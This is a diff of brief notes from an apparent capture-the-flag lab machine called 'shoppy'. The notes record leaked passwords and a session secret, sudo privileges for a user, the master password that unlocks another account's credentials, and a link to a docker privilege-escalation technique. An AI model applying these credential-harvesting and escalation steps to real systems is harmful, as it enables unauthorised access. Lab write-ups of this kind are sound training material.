@@ -30,9 +30,31 @@ password : Sh0ppyBest@pp!
 
 # app session
 secret : DJ7aAdnkCZs9DZWx[sudo] password for jaeger: 
+
+# sudo -l
 Matching Defaults entries for jaeger on shoppy:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User jaeger may run the following commands on shoppy:
     (deploy) /home/deploy/password-manager
 
+
+# password
+Sample
+
+# commande password-manager
+sudo -u deploy /home/deploy/password-manager
+
+# result 
+[sudo] password for jaeger: 
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+
+# connection ssh deploy id
+
+# docker sudo
+https://gtfobins.github.io/gtfobins/docker/
